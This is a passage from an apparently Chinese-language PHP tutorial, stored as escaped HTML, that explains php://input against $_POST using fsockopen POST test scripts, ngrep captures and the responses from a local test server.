&lt;span&gt;.&lt;/span&gt; &lt;a href=&quot;http://www.php.net/urldecode&quot;&gt;&lt;span&gt;&lt;font color=&quot;#000066&quot;&gt;urldecode&lt;/font&gt;&lt;/span&gt;&lt;/a&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;(&lt;/font&gt;&lt;/span&gt;&lt;span&gt;''perfgeeks''&lt;/span&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;)&lt;/font&gt;&lt;/span&gt; &lt;span&gt;.&lt;/span&gt; &lt;span&gt;''&amp;amp;amp;p=''&lt;/span&gt; &lt;span&gt;.&lt;/span&gt; &lt;a href=&quot;http://www.php.net/urldecode&quot;&gt;&lt;span&gt;&lt;font color=&quot;#000066&quot;&gt;urldecode&lt;/font&gt;&lt;/span&gt;&lt;/a&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;(&lt;/font&gt;&lt;/span&gt;&lt;span&gt;''7788''&lt;/span&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;)&lt;/font&gt;&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span&gt;$http_entity_type&lt;/span&gt; &lt;span&gt;=&lt;/span&gt; &lt;span&gt;''application/x-www-form-urlencoded''&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span&gt;$http_entity_length&lt;/span&gt; &lt;span&gt;=&lt;/span&gt; &lt;a href=&quot;http://www.php.net/strlen&quot;&gt;&lt;span&gt;&lt;font color=&quot;#000066&quot;&gt;strlen&lt;/font&gt;&lt;/span&gt;&lt;/a&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;(&lt;/font&gt;&lt;/span&gt;&lt;span&gt;$http_entity_body&lt;/span&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;)&lt;/font&gt;&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span&gt;$host&lt;/span&gt; &lt;span&gt;=&lt;/span&gt; &lt;span&gt;''192.168.0.6''&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span&gt;$port&lt;/span&gt; &lt;span&gt;=&lt;/span&gt; &lt;span&gt;&lt;font color=&quot;#ff33ff&quot;&gt;80&lt;/font&gt;&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span&gt;$path&lt;/span&gt; &lt;span&gt;=&lt;/span&gt; &lt;span&gt;''/phpinput_server.php''&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span&gt;$fp&lt;/span&gt; &lt;span&gt;=&lt;/span&gt; &lt;a href=&quot;http://www.php.net/fsockopen&quot;&gt;&lt;span&gt;&lt;font color=&quot;#000066&quot;&gt;fsockopen&lt;/font&gt;&lt;/span&gt;&lt;/a&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;(&lt;/font&gt;&lt;/span&gt;&lt;span&gt;$host&lt;/span&gt;&lt;span&gt;,&lt;/span&gt; &lt;span&gt;$port&lt;/span&gt;&lt;span&gt;,&lt;/span&gt; &lt;span&gt;$error_no&lt;/span&gt;&lt;span&gt;,&lt;/span&gt; &lt;span&gt;$error_desc&lt;/span&gt;&lt;span&gt;,&lt;/span&gt; 30&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;)&lt;/font&gt;&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span&gt;&lt;font color=&quot;#a1a100&quot;&gt;if&lt;/font&gt;&lt;/span&gt; &lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;(&lt;/font&gt;&lt;/span&gt;&lt;span&gt;$fp&lt;/span&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;)&lt;/font&gt;&lt;/span&gt; &lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;{&lt;/font&gt;&lt;/span&gt;&lt;br /&gt;\r\n &lt;a href=&quot;http://www.php.net/fputs&quot;&gt;&lt;span&gt;&lt;font color=&quot;#000066&quot;&gt;fputs&lt;/font&gt;&lt;/span&gt;&lt;/a&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;(&lt;/font&gt;&lt;/span&gt;&lt;span&gt;$fp&lt;/span&gt;&lt;span&gt;,&lt;/span&gt; &lt;span&gt;&lt;font color=&quot;#ff0000&quot;&gt;&quot;POST &lt;span&gt;{$path}&lt;/span&gt; HTTP/1.1&lt;span&gt;\\r&lt;/span&gt;&lt;span&gt;\\n&lt;/span&gt;&quot;&lt;/font&gt;&lt;/span&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;)&lt;/font&gt;&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n &lt;a href=&quot;http://www.php.net/fputs&quot;&gt;&lt;span&gt;&lt;font color=&quot;#000066&quot;&gt;fputs&lt;/font&gt;&lt;/span&gt;&lt;/a&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;(&lt;/font&gt;&lt;/span&gt;&lt;span&gt;$fp&lt;/span&gt;&lt;span&gt;,&lt;/span&gt; &lt;span&gt;&lt;font color=&quot;#ff0000&quot;&gt;&quot;Host: &lt;span&gt;{$host}&lt;/span&gt;&lt;span&gt;\\r&lt;/span&gt;&lt;span&gt;\\n&lt;/span&gt;&quot;&lt;/font&gt;&lt;/span&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;)&lt;/font&gt;&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n &lt;a href=&quot;http://www.php.net/fputs&quot;&gt;&lt;span&gt;&lt;font color=&quot;#000066&quot;&gt;fputs&lt;/font&gt;&lt;/span&gt;&lt;/a&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;(&lt;/font&gt;&lt;/span&gt;&lt;span&gt;$fp&lt;/span&gt;&lt;span&gt;,&lt;/span&gt; &lt;span&gt;&lt;font color=&quot;#ff0000&quot;&gt;&quot;Content-Type: &lt;span&gt;{$http_entity_type}&lt;/span&gt;&lt;span&gt;\\r&lt;/span&gt;&lt;span&gt;\\n&lt;/span&gt;&quot;&lt;/font&gt;&lt;/span&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;)&lt;/font&gt;&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n &lt;a href=&quot;http://www.php.net/fputs&quot;&gt;&lt;span&gt;&lt;font color=&quot;#000066&quot;&gt;fputs&lt;/font&gt;&lt;/span&gt;&lt;/a&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;(&lt;/font&gt;&lt;/span&gt;&lt;span&gt;$fp&lt;/span&gt;&lt;span&gt;,&lt;/span&gt; &lt;span&gt;&lt;font color=&quot;#ff0000&quot;&gt;&quot;Content-Length: &lt;span&gt;{$http_entity_length}&lt;/span&gt;&lt;span&gt;\\r&lt;/span&gt;&lt;span&gt;\\n&lt;/span&gt;&quot;&lt;/font&gt;&lt;/span&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;)&lt;/font&gt;&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n &lt;a href=&quot;http://www.php.net/fputs&quot;&gt;&lt;span&gt;&lt;font color=&quot;#000066&quot;&gt;fputs&lt;/font&gt;&lt;/span&gt;&lt;/a&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;(&lt;/font&gt;&lt;/span&gt;&lt;span&gt;$fp&lt;/span&gt;&lt;span&gt;,&lt;/span&gt; &lt;span&gt;&lt;font color=&quot;#ff0000&quot;&gt;&quot;Connection: close&lt;span&gt;\\r&lt;/span&gt;&lt;span&gt;\\n&lt;/span&gt;&lt;span&gt;\\r&lt;/span&gt;&lt;span&gt;\\n&lt;/span&gt;&quot;&lt;/font&gt;&lt;/span&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;)&lt;/font&gt;&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n &lt;a href=&quot;http://www.php.net/fputs&quot;&gt;&lt;span&gt;&lt;font color=&quot;#000066&quot;&gt;fputs&lt;/font&gt;&lt;/span&gt;&lt;/a&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;(&lt;/font&gt;&lt;/span&gt;&lt;span&gt;$fp&lt;/span&gt;&lt;span&gt;,&lt;/span&gt; &lt;span&gt;$http_entity_body&lt;/span&gt; &lt;span&gt;.&lt;/span&gt; &lt;span&gt;&lt;font color=&quot;#ff0000&quot;&gt;&quot;&lt;span&gt;\\r&lt;/span&gt;&lt;span&gt;\\n&lt;/span&gt;&lt;span&gt;\\r&lt;/span&gt;&lt;span&gt;\\n&lt;/span&gt;&quot;&lt;/font&gt;&lt;/span&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;)&lt;/font&gt;&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n &lt;br /&gt;\r\n &lt;span&gt;&lt;font color=&quot;#a1a100&quot;&gt;while&lt;/font&gt;&lt;/span&gt; &lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;(&lt;/font&gt;&lt;/span&gt;&lt;span&gt;!&lt;/span&gt;&lt;a href=&quot;http://www.php.net/feof&quot;&gt;&lt;span&gt;&lt;font color=&quot;#000066&quot;&gt;feof&lt;/font&gt;&lt;/span&gt;&lt;/a&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;(&lt;/font&gt;&lt;/span&gt;&lt;span&gt;$fp&lt;/span&gt;&lt;font color=&quot;#66cc66&quot;&gt;&lt;span&gt;)&lt;/span&gt;&lt;span&gt;)&lt;/span&gt;&lt;/font&gt; &lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;{&lt;/font&gt;&lt;/span&gt;&lt;br /&gt;\r\n &lt;span&gt;$d&lt;/span&gt; &lt;span&gt;.=&lt;/span&gt; &lt;a href=&quot;http://www.php.net/fgets&quot;&gt;&lt;span&gt;&lt;font color=&quot;#000066&quot;&gt;fgets&lt;/font&gt;&lt;/span&gt;&lt;/a&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;(&lt;/font&gt;&lt;/span&gt;&lt;span&gt;$fp&lt;/span&gt;&lt;span&gt;,&lt;/span&gt; 4096&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;)&lt;/font&gt;&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n &lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;}&lt;/font&gt;&lt;/span&gt;&lt;br /&gt;\r\n &lt;a href=&quot;http://www.php.net/fclose&quot;&gt;&lt;span&gt;&lt;font color=&quot;#000066&quot;&gt;fclose&lt;/font&gt;&lt;/span&gt;&lt;/a&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;(&lt;/font&gt;&lt;/span&gt;&lt;span&gt;$fp&lt;/span&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;)&lt;/font&gt;&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n &lt;span&gt;&lt;font color=&quot;#a1a100&quot;&gt;echo&lt;/font&gt;&lt;/span&gt; &lt;span&gt;$d&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;}&lt;/font&gt;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span&gt;?&amp;gt;&lt;/span&gt;&lt;/pre&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt; &lt;p&gt;我们可以通过使用工具ngrep抓取http请求包（因为我们需要探知的是php://input，所以我们这里只抓取http Request数据包）。我们来执行测试脚本phpinput_post.php&lt;/p&gt;\r\n &lt;div&gt; &lt;pre&gt;&lt;span&gt;@&lt;/span&gt;php &lt;span&gt;/&lt;/span&gt;phpinput_post.php&lt;/pre&gt; &lt;/div&gt;\r\n &lt;pre&gt;HTTP/1.1 200 OK&lt;br /&gt;\r\nDate: Thu, 08 Apr 2010 03:23:36 GMT&lt;br /&gt;\r\nServer: Apache/2.2.3 (CentOS)&lt;br /&gt;\r\nX-Powered-By: PHP/5.1.6&lt;br /&gt;\r\nContent-Length: 160&lt;br /&gt;\r\nConnection: close&lt;br /&gt;\r\nContent-Type: text/html; charset=UTF-8&lt;br /&gt;\r\n-------$_POST------------------&lt;br /&gt;\r\narray(2) {&lt;br /&gt;\r\n [&quot;n&quot;]=&amp;gt; string(9) &quot;perfgeeks&quot;&lt;br /&gt;\r\n [&quot;p&quot;]=&amp;gt; string(4) &quot;7788&quot;&lt;br /&gt;\r\n}&lt;br /&gt;\r\n-------php://input-------------&lt;br /&gt;\r\n&lt;strong&gt;n=perfgeeks&amp;amp;p=7788&lt;/strong&gt;&lt;/pre&gt; &lt;p&gt;通过ngrep抓到的http请求包如下:&lt;/p&gt;\r\n &lt;pre&gt;T 192.168.0.8:57846 -&amp;gt; 192.168.0.6:80 [AP]&lt;br /&gt;\r\n &lt;strong&gt;POST&lt;/strong&gt; /phpinput_server.php HTTP/1.1..&lt;br /&gt;\r\n Host: 192.168.0.6..&lt;strong&gt;Content-Type: application/x-www-form-urlencoded&lt;/strong&gt;..Co&lt;br /&gt;\r\n ntent-Length: 18..Connection: close....&lt;strong&gt;n=perfgeeks&amp;amp;p=7788&lt;/strong&gt;....&lt;/pre&gt; &lt;p&gt;仔细观察，我们不难发现&lt;br /&gt;\r\n 1，$_POST数据,php://input 数据与httpd entity body数据是“一致”的&lt;br /&gt;\r\n 2，http请求中的Content-Type是application/x-www-form-urlencoded ，它表示http请求body中的数据是使用http的post方法提交的表单数据，并且进行了urlencode()处理。&lt;br /&gt;\r\n (注:注意加粗部分内容，下文不再提示).&lt;/p&gt;\r\n &lt;p&gt;我们再来看看脚本phpinput_xmlrpc.php的原文件内容，它模拟了一个POST方法提交的xml-rpc请求。&lt;/p&gt;\r\n &lt;pre&gt;&lt;div&gt;&lt;pre&gt;&lt;span&gt;&lt;strong&gt;&amp;lt;?php&lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span&gt;&lt;font color=&quot;#808080&quot;&gt;//@file phpinput_xmlrpc.php&lt;/font&gt;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span&gt;$http_entity_body&lt;/span&gt; &lt;span&gt;=&lt;/span&gt; &lt;span&gt;&lt;font color=&quot;#ff0000&quot;&gt;&quot;&lt;span&gt;\\n&lt;/span&gt;&lt;span&gt;\\n&lt;/span&gt; jt_userinfo&lt;span&gt;\\n&lt;/span&gt;&quot;&lt;/font&gt;&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span&gt;$http_entity_type&lt;/span&gt; &lt;span&gt;=&lt;/span&gt; &lt;span&gt;''text/html''&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span&gt;$http_entity_length&lt;/span&gt; &lt;span&gt;=&lt;/span&gt; &lt;a href=&quot;http://www.php.net/strlen&quot;&gt;&lt;span&gt;&lt;font color=&quot;#000066&quot;&gt;strlen&lt;/font&gt;&lt;/span&gt;&lt;/a&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;(&lt;/font&gt;&lt;/span&gt;&lt;span&gt;$http_entity_body&lt;/span&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;)&lt;/font&gt;&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span&gt;$host&lt;/span&gt; &lt;span&gt;=&lt;/span&gt; &lt;span&gt;''192.168.0.6''&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span&gt;$port&lt;/span&gt; &lt;span&gt;=&lt;/span&gt; &lt;span&gt;&lt;font color=&quot;#ff33ff&quot;&gt;80&lt;/font&gt;&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span&gt;$path&lt;/span&gt; &lt;span&gt;=&lt;/span&gt; &lt;span&gt;''/phpinput_server.php''&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span&gt;$fp&lt;/span&gt; &lt;span&gt;=&lt;/span&gt; &lt;a href=&quot;http://www.php.net/fsockopen&quot;&gt;&lt;span&gt;&lt;font color=&quot;#000066&quot;&gt;fsockopen&lt;/font&gt;&lt;/span&gt;&lt;/a&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;(&lt;/font&gt;&lt;/span&gt;&lt;span&gt;$host&lt;/span&gt;&lt;span&gt;,&lt;/span&gt; &lt;span&gt;$port&lt;/span&gt;&lt;span&gt;,&lt;/span&gt; &lt;span&gt;$error_no&lt;/span&gt;&lt;span&gt;,&lt;/span&gt; &lt;span&gt;$error_desc&lt;/span&gt;&lt;span&gt;,&lt;/span&gt; 30&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;)&lt;/font&gt;&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span&gt;&lt;font color=&quot;#a1a100&quot;&gt;if&lt;/font&gt;&lt;/span&gt; &lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;(&lt;/font&gt;&lt;/span&gt;&lt;span&gt;$fp&lt;/span&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;)&lt;/font&gt;&lt;/span&gt; &lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;{&lt;/font&gt;&lt;/span&gt;&lt;br /&gt;\r\n &lt;a href=&quot;http://www.php.net/fputs&quot;&gt;&lt;span&gt;&lt;font color=&quot;#000066&quot;&gt;fputs&lt;/font&gt;&lt;/span&gt;&lt;/a&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;(&lt;/font&gt;&lt;/span&gt;&lt;span&gt;$fp&lt;/span&gt;&lt;span&gt;,&lt;/span&gt; &lt;span&gt;&lt;font color=&quot;#ff0000&quot;&gt;&quot;POST &lt;span&gt;{$path}&lt;/span&gt; HTTP/1.1&lt;span&gt;\\r&lt;/span&gt;&lt;span&gt;\\n&lt;/span&gt;&quot;&lt;/font&gt;&lt;/span&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;)&lt;/font&gt;&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n &lt;a href=&quot;http://www.php.net/fputs&quot;&gt;&lt;span&gt;&lt;font color=&quot;#000066&quot;&gt;fputs&lt;/font&gt;&lt;/span&gt;&lt;/a&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;(&lt;/font&gt;&lt;/span&gt;&lt;span&gt;$fp&lt;/span&gt;&lt;span&gt;,&lt;/span&gt; &lt;span&gt;&lt;font color=&quot;#ff0000&quot;&gt;&quot;Host: &lt;span&gt;{$host}&lt;/span&gt;&lt;span&gt;\\r&lt;/span&gt;&lt;span&gt;\\n&lt;/span&gt;&quot;&lt;/font&gt;&lt;/span&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;)&lt;/font&gt;&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n &lt;a href=&quot;http://www.php.net/fputs&quot;&gt;&lt;span&gt;&lt;font color=&quot;#000066&quot;&gt;fputs&lt;/font&gt;&lt;/span&gt;&lt;/a&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;(&lt;/font&gt;&lt;/span&gt;&lt;span&gt;$fp&lt;/span&gt;&lt;span&gt;,&lt;/span&gt; &lt;span&gt;&lt;font color=&quot;#ff0000&quot;&gt;&quot;Content-Type: &lt;span&gt;{$http_entity_type}&lt;/span&gt;&lt;span&gt;\\r&lt;/span&gt;&lt;span&gt;\\n&lt;/span&gt;&quot;&lt;/font&gt;&lt;/span&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;)&lt;/font&gt;&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n &lt;a href=&quot;http://www.php.net/fputs&quot;&gt;&lt;span&gt;&lt;font color=&quot;#000066&quot;&gt;fputs&lt;/font&gt;&lt;/span&gt;&lt;/a&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;(&lt;/font&gt;&lt;/span&gt;&lt;span&gt;$fp&lt;/span&gt;&lt;span&gt;,&lt;/span&gt; &lt;span&gt;&lt;font color=&quot;#ff0000&quot;&gt;&quot;Content-Length: &lt;span&gt;{$http_entity_length}&lt;/span&gt;&lt;span&gt;\\r&lt;/span&gt;&lt;span&gt;\\n&lt;/span&gt;&quot;&lt;/font&gt;&lt;/span&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;)&lt;/font&gt;&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n &lt;a href=&quot;http://www.php.net/fputs&quot;&gt;&lt;span&gt;&lt;font color=&quot;#000066&quot;&gt;fputs&lt;/font&gt;&lt;/span&gt;&lt;/a&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;(&lt;/font&gt;&lt;/span&gt;&lt;span&gt;$fp&lt;/span&gt;&lt;span&gt;,&lt;/span&gt; &lt;span&gt;&lt;font color=&quot;#ff0000&quot;&gt;&quot;Connection: close&lt;span&gt;\\r&lt;/span&gt;&lt;span&gt;\\n&lt;/span&gt;&lt;span&gt;\\r&lt;/span&gt;&lt;span&gt;\\n&lt;/span&gt;&quot;&lt;/font&gt;&lt;/span&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;)&lt;/font&gt;&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n &lt;a href=&quot;http://www.php.net/fputs&quot;&gt;&lt;span&gt;&lt;font color=&quot;#000066&quot;&gt;fputs&lt;/font&gt;&lt;/span&gt;&lt;/a&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;(&lt;/font&gt;&lt;/span&gt;&lt;span&gt;$fp&lt;/span&gt;&lt;span&gt;,&lt;/span&gt; &lt;span&gt;$http_entity_body&lt;/span&gt; &lt;span&gt;.&lt;/span&gt; &lt;span&gt;&lt;font color=&quot;#ff0000&quot;&gt;&quot;&lt;span&gt;\\r&lt;/span&gt;&lt;span&gt;\\n&lt;/span&gt;&lt;span&gt;\\r&lt;/span&gt;&lt;span&gt;\\n&lt;/span&gt;&quot;&lt;/font&gt;&lt;/span&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;)&lt;/font&gt;&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n &lt;span&gt;&lt;font color=&quot;#a1a100&quot;&gt;while&lt;/font&gt;&lt;/span&gt; &lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;(&lt;/font&gt;&lt;/span&gt;&lt;span&gt;!&lt;/span&gt;&lt;a href=&quot;http://www.php.net/feof&quot;&gt;&lt;span&gt;&lt;font color=&quot;#000066&quot;&gt;feof&lt;/font&gt;&lt;/span&gt;&lt;/a&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;(&lt;/font&gt;&lt;/span&gt;&lt;span&gt;$fp&lt;/span&gt;&lt;font color=&quot;#66cc66&quot;&gt;&lt;span&gt;)&lt;/span&gt;&lt;span&gt;)&lt;/span&gt;&lt;/font&gt; &lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;{&lt;/font&gt;&lt;/span&gt;&lt;br /&gt;\r\n &lt;span&gt;$d&lt;/span&gt; &lt;span&gt;.=&lt;/span&gt; &lt;a href=&quot;http://www.php.net/fgets&quot;&gt;&lt;span&gt;&lt;font color=&quot;#000066&quot;&gt;fgets&lt;/font&gt;&lt;/span&gt;&lt;/a&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;(&lt;/font&gt;&lt;/span&gt;&lt;span&gt;$fp&lt;/span&gt;&lt;span&gt;,&lt;/span&gt; 4096&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;)&lt;/font&gt;&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n &lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;}&lt;/font&gt;&lt;/span&gt;&lt;br /&gt;\r\n &lt;br /&gt;\r\n &lt;a href=&quot;http://www.php.net/fclose&quot;&gt;&lt;span&gt;&lt;font color=&quot;#000066&quot;&gt;fclose&lt;/font&gt;&lt;/span&gt;&lt;/a&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;(&lt;/font&gt;&lt;/span&gt;&lt;span&gt;$fp&lt;/span&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;)&lt;/font&gt;&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n &lt;span&gt;&lt;font color=&quot;#a1a100&quot;&gt;echo&lt;/font&gt;&lt;/span&gt; &lt;span&gt;$d&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;}&lt;/font&gt;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span&gt;?&amp;gt;&lt;/span&gt;&lt;/pre&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt; &lt;p&gt;同样地，让我们来执行这个测试脚本&lt;/p&gt;\r\n &lt;div&gt; &lt;pre&gt;&lt;span&gt;@&lt;/span&gt;php &lt;span&gt;/&lt;/span&gt;phpinput_xmlrcp.php&lt;/pre&gt; &lt;/div&gt;\r\n &lt;pre&gt;HTTP/1.1 200 OK&lt;br /&gt;\r\nDate: Thu, 08 Apr 2010 03:47:18 GMT&lt;br /&gt;\r\nServer: Apache/2.2.3 (CentOS)&lt;br /&gt;\r\nX-Powered-By: PHP/5.1.6&lt;br /&gt;\r\nContent-Length: 154&lt;br /&gt;\r\nConnection: close&lt;br /&gt;\r\nContent-Type: text/html; charset=UTF-8&lt;br /&gt;\r\n&lt;br /&gt;\r\n-------$_POST------------------&lt;br /&gt;\r\narray(0) {&lt;br /&gt;\r\n}&lt;br /&gt;\r\n&lt;br /&gt;\r\n-------php://input-------------&lt;br /&gt;\r\n&lt;strong&gt;&amp;lt;?xml version=&quot;1.0&quot;&amp;gt;&lt;br /&gt;\r\n&amp;lt;methodcall&amp;gt;&lt;br /&gt;\r\n &amp;lt;name&amp;gt;jt_userinfo&amp;lt;/name&amp;gt;&lt;br /&gt;\r\n&amp;lt;/methodcall&amp;gt;&lt;/strong&gt;&lt;/pre&gt; &lt;p&gt;执行这个脚本的时候，我们通过ngrep抓取的http请求数据包如下&lt;/p&gt;\r\n &lt;pre&gt;T 192.168.0.8:45570 -&amp;gt; 192.168.0.6:80 [AP]&lt;br /&gt;\r\n &lt;strong&gt;POST&lt;/strong&gt; /phpinput_server.php HTTP/1.1..&lt;br /&gt;\r\n Host: 192.168.0.6..&lt;strong&gt;Content-Type: text/html&lt;/strong&gt;..Content-Length: 75..Connec&lt;br /&gt;\r\n tion: close....&lt;strong&gt;&amp;lt;?xml version=&quot;1.0&quot;&amp;gt;.&amp;lt;methodcall&amp;gt;. &amp;lt;name&amp;gt;jt_userinfo&amp;lt;&lt;br /&gt;\r\n /name&amp;gt;.&amp;lt;/methodcall&amp;gt;&lt;/strong&gt;....&lt;/pre&gt; &lt;p&gt;同样，我样也可以很容易地发现:&lt;br /&gt;\r\n 1，http请求中的Content-Type是text/xml。它表示http请求中的body数据是xml数据格式。&lt;br /&gt;\r\n 2，服务端$_POST打印出来的是一个空数组，即与http entity body不一致了。这跟上个例子不一样了，这里的Content-Type是text/xml,而不是application/x-www-form- urlencoded&lt;br /&gt;\r\n 3，而php://input数据还是跟http entity body数据一致。也就是php://input数据和$_POST数据不一致了。&lt;/p&gt;\r\n &lt;p&gt;我们再来看看通过GET方法提交表单数据的情况，php://input能不能读取到GET方法的表单数据？在这里，我们稍加改动一下 phpinput_server.php文件，将$_POST改成$_GET。&lt;/p&gt;\r\n &lt;pre&gt;&lt;div&gt;&lt;pre&gt;&lt;span&gt;&lt;strong&gt;&amp;lt;?php&lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span&gt;&lt;font color=&quot;#808080&quot;&gt;//@file phpinput_server.php&lt;/font&gt;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span&gt;$raw_post_data&lt;/span&gt; &lt;span&gt;=&lt;/span&gt; &lt;a href=&quot;http://www.php.net/file_get_contents&quot;&gt;&lt;span&gt;&lt;font color=&quot;#000066&quot;&gt;file_get_contents&lt;/font&gt;&lt;/span&gt;&lt;/a&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;(&lt;/font&gt;&lt;/span&gt;&lt;span&gt;''php://input''&lt;/span&gt;&lt;span&gt;,&lt;/span&gt; &lt;span&gt;''r''&lt;/span&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;)&lt;/font&gt;&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span&gt;&lt;font color=&quot;#a1a100&quot;&gt;echo&lt;/font&gt;&lt;/span&gt; &lt;span&gt;&lt;font 